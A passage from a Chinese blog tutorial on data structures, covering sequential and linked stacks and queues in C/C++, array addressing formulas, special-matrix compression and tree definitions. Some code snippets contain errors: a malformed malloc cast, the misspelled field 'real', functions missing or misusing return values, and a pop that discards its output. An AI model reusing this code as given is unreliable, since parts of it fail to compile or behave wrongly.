class="string">&quot;栈已满，不能入栈！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;top++;</span><br><span class="line">        s-&gt;<span class="built_in">stack</span>[s-&gt;top] = data;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*取栈顶元素，将栈顶元素输出*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackGetTop</span><span class="params">(SeqStack s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.top==<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈为空！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s.<span class="built_in">stack</span>[s.top]);</span><br><span class="line">        s.top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*输入要入栈的元素以 -1 作为结束标志*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackInput</span><span class="params">(SeqStack* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    <span class="keyword">while</span> (data != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        StackPush(s, data);</span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印栈中元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Display</span><span class="params">(SeqStack s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = s.top; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%-3d&quot;</span>, s.<span class="built_in">stack</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*出栈操作，将栈顶指针top-- */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackPop</span><span class="params">(SeqStack* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;top==<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈为空！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*返回栈的长度,栈的长度就是栈中元素的个数*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackLength</span><span class="params">(SeqStack s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     s.top + <span class="number">1</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s.top + <span class="number">1</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*清空栈，清空栈与初始化栈的操作一样，只需将栈顶指针置-1即可*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackClear</span><span class="params">(SeqStack* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SeqStack s;</span><br><span class="line">    InitStack(&amp;s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入入栈元素：\n&quot;</span>);</span><br><span class="line">    StackInput(&amp;s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;栈中元素为：\n&quot;</span>);</span><br><span class="line">    Display(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;栈顶元素为：\n&quot;</span>);</span><br><span class="line">    StackGetTop(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;栈中元素个数为:\n&quot;</span>);</span><br><span class="line">    StackLength(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;退一次栈!\n&quot;</span>);</span><br><span class="line">    StackPop(&amp;s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;栈中元素为：\n&quot;</span>);</span><br><span class="line">    Display(s);</span><br><span class="line">    StackClear(&amp;s);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以下是定义结构体实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Status int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SElemType int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="comment">//栈数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;<span class="comment">//栈底指针 不变</span></span><br><span class="line">    SElemType *top;<span class="comment">//栈顶指针 一直在栈顶元素上一个位置</span></span><br><span class="line">    <span class="keyword">int</span> stacksize;<span class="comment">//栈可用的最大容量</span></span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="comment">//**************************************基本操作函数************************************//</span></span><br><span class="line"><span class="comment">//初始化函数</span></span><br><span class="line"><span class="function">Status <span class="title">InitStack</span><span class="params">(SqStack &amp;s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s.base=<span class="keyword">new</span> SElemType[MaxSize];<span class="comment">//动态分配最大容量</span></span><br><span class="line">    <span class="keyword">if</span>(!s.base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分配失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s.top=s.base;<span class="comment">//栈顶指针与栈底相同 王道上top起初在base下面，感觉很别扭，top应该高于或等于base</span></span><br><span class="line">    s.stacksize=MaxSize;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//入栈</span></span><br><span class="line"><span class="function">Status <span class="title">Push</span><span class="params">(SqStack &amp;s,SElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.top-s.base==s.stacksize) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//栈满</span></span><br><span class="line">    *(s.top++)=e;<span class="comment">//先入栈，栈顶指针再上移 注意与王道上的不同，具体问题具体分析</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//出栈 用e返回值</span></span><br><span class="line"><span class="function">Status <span class="title">Pop</span><span class="params">(SqStack &amp;s,SElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.top==s.base) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//栈空</span></span><br><span class="line">    e=*--s.top;<span class="comment">//先减减 指向栈顶元素，再给e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//得到栈顶元素，不修改指针</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetTop</span><span class="params">(SqStack s,SElemType &amp;e)</span> <span class="comment">//严蔚敏版59页有问题，应该用e去获得，函数返回bool类型去判断</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.top==s.base) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//栈空			</span></span><br><span class="line">    <span class="keyword">else</span> e=*--s.top;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//********************************功能实现函数**************************************//</span></span><br><span class="line"><span class="comment">//菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********1.入栈      2.出栈*********\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********3.取栈顶    4.退出*********\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//入栈功能函数 调用Push函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PushToStack</span><span class="params">(SqStack &amp;s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;SElemType e;<span class="keyword">int</span> flag;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入入栈元素个数(&gt;=1)：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入第%d个元素的值:&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;e);</span><br><span class="line">        flag=Push(s,e);</span><br><span class="line">        <span class="keyword">if</span>(flag)<span class="built_in">printf</span>(<span class="string">&quot;%d已入栈\n&quot;</span>,e);</span><br><span class="line">        <span class="keyword">else</span> &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈已满！！！\n&quot;</span>);<span class="keyword">break</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//出栈功能函数 调用Pop函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopFromStack</span><span class="params">(SqStack &amp;s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;SElemType e;<span class="keyword">int</span> flag;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入出栈元素个数(&gt;=1)：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=Pop(s,e);</span><br><span class="line">        <span class="keyword">if</span>(flag)<span class="built_in">printf</span>(<span class="string">&quot;%d已出栈\n&quot;</span>,e);</span><br><span class="line">        <span class="keyword">else</span> &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈已空！！！\n&quot;</span>);<span class="keyword">break</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取栈顶功能函数 调用GetTop</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTopOfStack</span><span class="params">(SqStack &amp;s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SElemType e;<span class="keyword">bool</span> flag; </span><br><span class="line">    flag=GetTop(s,e);</span><br><span class="line">    <span class="keyword">if</span>(flag)<span class="built_in">printf</span>(<span class="string">&quot;栈顶元素为:%d\n&quot;</span>,e);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;栈已空！！！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqStack s;<span class="keyword">int</span> choice;</span><br><span class="line">    InitStack(s);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入菜单序号：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">if</span>(choice==<span class="number">4</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:PushToStack(s);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:PopFromStack(s);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:GetTopOfStack(s);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="built_in">printf</span>(<span class="string">&quot;输入错误！！！\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-3-链栈及基本操作"><a href="#3-3-链栈及基本操作" class="headerlink" title="3.3 链栈及基本操作"></a>3.3 链栈及基本操作</h2><p>把栈顶放在单链表的表头，用链表来存储栈的数据结构称为链栈。</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/7/20/164b52876589ba10?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="123" style="zoom:80%;" /></p>
<p>链栈节点定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode;</span><br></pre></td></tr></table></figure>
<h3 id="3-3-1-链栈的操作"><a href="#3-3-1-链栈的操作" class="headerlink" title="3.3.1 链栈的操作"></a>3.3.1 链栈的操作</h3><p>链栈也有四个元素，包括两个状态和两个操作</p>
<p>状态：</p>
<p>1）栈空：<code>lst-&gt;next == NULL</code>，即栈没有后继节点时，栈为空</p>
<p>2）栈满：如果存储空间无限大，没有这种情况。</p>
<p>操作：</p>
<p>进栈是头插法建立链表的插入方法，出栈就是单链表的删除操作</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/7/20/164b528765a415aa?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="00" style="zoom:67%;" /></p>
<p>链栈的插入操作</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/7/20/164b52876668edc8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="66" style="zoom:67%;" /></p>
<p>链栈的删除操作</p>
<ul>
<li>链栈初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initStack</span><span class="params">(LNode *&amp;lst)</span></span>&#123;</span><br><span class="line">    lst = (LNode)*<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//制造一个头结点</span></span><br><span class="line">    lst-&gt;next = <span class="literal">NULL</span>;					 <span class="comment">//初始头结点指向NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(LNode *lst, <span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    LNode *p;</span><br><span class="line">    p = (LNode)*<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//进栈，相当于链表的头插法</span></span><br><span class="line">    p-&gt;data = x;			<span class="comment">//将x赋值给p结点的值域</span></span><br><span class="line">    p-&gt;next = lst-&gt;next;	<span class="comment">//p指针指向原lst指向的结点</span></span><br><span class="line">    lst-&gt;next = p;			<span class="comment">//lst指向结点p</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>出栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(LNode *lst, <span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="keyword">if</span>(lst-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//出栈，相当于链表的删除</span></span><br><span class="line">    p = lst-&gt;next;</span><br><span class="line">    x = p-&gt;data;</span><br><span class="line">    lst-&gt;next = p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-4-什么是队列"><a href="#3-4-什么是队列" class="headerlink" title="3.4 什么是队列"></a>3.4 什么是队列</h2><p>　　与栈不同的是，队列的两端都“开口”，要求数据只能从一端进，从另一端出。</p>
<p><img src="http://c.biancheng.net/uploads/allimg/190426/1I33AU8-0.gif" alt="1234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通常，称进数据的一端叫做“队尾”，出数据的一端叫做“队头”，添加数据叫做入队，出队列叫做出队</span><br></pre></td></tr></table></figure>
<p>队列遵循<font color="ff0000">先进先出的原则</font>，队列存储结构的实现有以下两种方式：</p>
<ul>
<li>顺序队列：在顺序表的基础上实现队列的结构</li>
<li>链队列：在链表的基础上实现队列结构</li>
</ul>
<h3 id="3-4-1-队列的顺序存储"><a href="#3-4-1-队列的顺序存储" class="headerlink" title="3.4.1 队列的顺序存储"></a>3.4.1 队列的顺序存储</h3><p>　　为了满足顺序队列中数据从队尾进，队头出且先进先出的要求，我们还需要定义两个指针（top 和 rear）分别用于指向顺序队列中的队头元素和队尾元素。</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/4/18/1718dca693468461?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="tt" style="zoom:50%;" /></p>
<p>由于顺序队列初始状态没有存储任何元素，因此 <code>top</code> 指针和 <code>rear</code> 指针重合，且由于顺序队列底层实现靠的是数组，因此 <code>top</code> 和 <code>rear</code> 实际上是两个变量，它的值分别是队头元素和队尾元素所在数组位置的下标。</p>
<p>用顺序表来存储队列元素的数据结构称为队列的顺序存储结构，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[maxsize];	<span class="comment">//定义数组</span></span><br><span class="line">    <span class="keyword">int</span> front;			<span class="comment">//队首指针</span></span><br><span class="line">    <span class="keyword">int</span> rear;			<span class="comment">//队尾指针</span></span><br><span class="line">&#125;SqQueue;				<span class="comment">//顺序队列定义</span></span><br></pre></td></tr></table></figure>
<h3 id="3-4-2-队列的链式存储结构"><a href="#3-4-2-队列的链式存储结构" class="headerlink" title="3.4.2 队列的链式存储结构"></a>3.4.2 队列的链式存储结构</h3><p>只需创建两个指针（命名为 top 和 rear）分别指向链表中队列的队头元素和队尾元素。</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/4/18/1718dca6c2c29574?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" style="zoom:50%;" /></p>
<p>如图所示为链式队列的初始状态，此时队列中没有存储任何数据元素，因此 top 和 rear 指针都同时指向头节点。</p>
<ul>
<li>链式队列的结构定义</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//节点结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;				<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span>		<span class="comment">//指针域</span></span><br><span class="line">&#125;QNode;</span><br><span class="line"><span class="comment">//队列的链表结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    QNode *front;		<span class="comment">//队头指针</span></span><br><span class="line">    QNode *rear;		<span class="comment">//队尾指针</span></span><br><span class="line">&#125;LiQueue;</span><br></pre></td></tr></table></figure>
<ul>
<li>链队的初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initQueue</span><span class="params">(LiQueue *&amp;lqu)</span></span>&#123;</span><br><span class="line">    lqu = (LiQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LiQueue));</span><br><span class="line">    lqu-&gt;front = lqu-&gt;real = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>链队的入队操作：如下图，表示链队列依次入队{1,2,3}三个元素</li>
</ul>
<p><img src="https://user-gold-cdn.xitu.io/2020/4/18/1718dca6c2b715c9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" style="zoom:50%;" /></p>
<p>如上图所示，当有新的数据入队时，要以下3步操作</p>
<blockquote>
<ol>
<li>将该数据元素用节点包裹，例如新节点名称为 elem；</li>
<li>与 rear 指针指向的节点建立逻辑关系，即执行 rear-&gt;next=elem；</li>
<li>最后移动 rear 指针指向该新节点，即 rear=elem；</li>
</ol>
</blockquote>
<ul>
<li>链队的出队操作：当有元素出队时，按照“先进先出”的原则，只需要将存储该数据的结点以及它之前入队的元素结点按照顺序依次出队。出队的过程就是从链表头一次删除首节点的过程，现在我们需要将上图{1,2}两个元素出队，如下图</li>
</ul>
<p><img src="https://user-gold-cdn.xitu.io/2020/4/18/1718dca6c81237bb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" style="zoom:50%;" /></p>
<p>所以我们知道，需要以下3步操作</p>
<blockquote>
<ol>
<li>通过 top 指针直接找到队头节点，创建一个新指针 p 指向此即将出队的节点；</li>
<li>将 p 节点（即要出队的队头节点）从链表中摘除；</li>
<li>释放节点 p，回收其所占的内存空间；</li>
</ol>
</blockquote>
<h1 id="第四章-串、数组和广义表"><a href="#第四章-串、数组和广义表" class="headerlink" title="第四章 串、数组和广义表"></a>第四章 串、数组和广义表</h1><h2 id="4-4-数组"><a href="#4-4-数组" class="headerlink" title="4.4 数组"></a>4.4 数组</h2><h3 id="4-4-1-数组的类型定义"><a href="#4-4-1-数组的类型定义" class="headerlink" title="4.4.1 数组的类型定义"></a>4.4.1 数组的类型定义</h3><p>　　数组是由类型相同的数据元素构成的有序集合，一维数组可以看成是一个线性表，二维数组可以看成数据元素是线性表的线性表。</p>
<h3 id="4-4-2-数组的顺序存储"><a href="#4-4-2-数组的顺序存储" class="headerlink" title="4.4.2 数组的顺序存储"></a>4.4.2 数组的顺序存储</h3><p>　　在Basic、Pascal、Java和C语言中，用的是以行序为主序的存储结构，而在FORTRAN语言中，用的是以列序为主序的存储结构。</p>
<p>　　假设每个数据元素占L个存储单元，则二维数组A[0..m-1,0..n-1]（即下标从0开始，共有m行n列）中任一元素a<sub>ij</sub>的存储位置可由下式确定</p>
<script type="math/tex; mode=display">LOC(i,j)=LOC(0,0)+(n{\times}i+j)L</script><p>式中，LOC(i,j)是a<sub>ij</sub>的存储位置；LOC(0,0)是a<sub>00</sub>的存储位置，即二维数组A的起始存储位置也称为基地址或基址。</p>
<p>得到一般推广情况，可以得到n维数组A[0..b<sub>1</sub>,0..b<sub>2</sub>,…,0..b<sub>n</sub>-1]的数据元素存储位置的计算公式：</p>
<script type="math/tex; mode=display">
\begin{aligned}LOC(j_1,j_2,...,j_n)&=LOC(0,0,...,0)+(b_2{\times}...b_n{\times}j_1+b_3{\times}...{\times}b_n{\times}j_2+...+b_n{\times}j_{n-1}+j_n)L\\&=LOC(0,0,...,0)+\left(
 \sum_{i=1}^{n-1}{j_i}\prod_{k=i+1}^{n}{b_k}+j_n
  \right)L
  \end{aligned}</script><p>可缩写成</p>
<script type="math/tex; mode=display">
LOC(j_1,j_2,...,j_n)=LOC(0,0,...,0)+\sum_{i=1}^{n}c_ij_i</script><p>其中，c<sub>n</sub>=L，c<sub>i-1</sub>=b<sub>i</sub>*c<sub>i</sub>，1&lt;i&lt;=n</p>
<h3 id="4-4-3-特殊矩阵的压缩存储"><a href="#4-4-3-特殊矩阵的压缩存储" class="headerlink" title="4.4.3 特殊矩阵的压缩存储"></a>4.4.3 特殊矩阵的压缩存储</h3><p><strong>1 对称矩阵</strong></p>
<p>[特点]　　在n*n的矩阵a中，满足以下性质：</p>
<script type="math/tex; mode=display">
a_{ij}=a_{ji}(a{\le}i,j{\le}n)</script><p>[存储方法]　　只存储下(或者上)三角(包括主对角线)的数据元素。共占用n(n+1)/2个元素空间。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617873987-image-20210408172627868.png" alt="image-20210408172627868"></p>
<script type="math/tex; mode=display">
k=\begin{cases}
\frac{i(i-1)}{2}+j-1,　i{\ge}j\\
\frac{j(j-1)}{2}+i-1,　j{\lt}i
\end{cases}</script><p><strong>2 三角矩阵</strong></p>
<p>[特点]　　对角线以下(或者以上)的数据元素(不包括对角线)全部为常数c。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617874886-image-20210408174126047.png" alt="image-20210408174126047"></p>
<p>[存储方法]　　重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[k]和矩阵元a<sub>ij</sub>之间的关系：</p>
<p>（1）上三角矩阵：</p>
<script type="math/tex; mode=display">
k=\begin{cases}
\frac{(i-1)\times(2n-i+2)}{2}+j-i　　　　i{\le}j\\
\frac{n(n+1)}{2}　　　　　　　　　　　　i{\gt}j
\end{cases}</script><p>（2）下三角矩阵：</p>
<script type="math/tex; mode=display">
k=\begin{cases}
\frac{i(i-1)}{2}+j-1　　　　i{\ge}j\\
\frac{n(n+1)}{2}　　　　　　　　i{\lt}j
\end{cases}</script><p><strong>3 对角矩阵</strong></p>
<p>[特点]　　在n*n的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内 — L对角矩阵。</p>
<p>[存储方法]</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617875446-image-20210408175046697.png" alt="image-20210408175046697" style="zoom:67%;" /></p>
<p><strong>4 稀疏矩阵</strong></p>
<p>[特点]　　大多数元素为0</p>
<p>[常用存储方法]　　只记录每一非零元素(i,j,a<sub>ij</sub>)</p>
<h1 id="第五章-树和二叉树"><a href="#第五章-树和二叉树" class="headerlink" title="第五章 树和二叉树"></a>第五章 树和二叉树</h1><h2 id="5-1-树和二叉树的定义"><a href="#5-1-树和二叉树的定义" class="headerlink" title="5.1 树和二叉树的定义"></a>5.1 树和二叉树的定义</h2><h3 id="5-1-1-树的定义"><a href="#5-1-1-树的定义" class="headerlink" title="5.1.1 树的定义"></a>5.1.1 树的定义</h3><p>　　树是n(n&gt;=0)个结点的有限集，它或为空树(n=0)；或为非空树，对于非空树T：</p>
<p>（1）有且仅有一个称之为根的结点；</p>
<p>（2）除根节点意外的其余结点可分为m（m&gt;0）个互不相交的有限集T<sub>1</sub>，T<sub>2</sub>，…，T<sub>m</sub>，其中每一个集合本身又是一棵树，并且称为根的子树。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617786835-image-20210407171355733.png" alt="image-20210407171355733" style="zoom:67%;" /></p>
<h3 id="5-1-2-树的基本术语"><a href="#5-1-2-树的基本术语" class="headerlink" title="5.1.2 树的基本术语"></a>5.1.2 树的基本术语</h3><p>如图5.1（b）：</p>
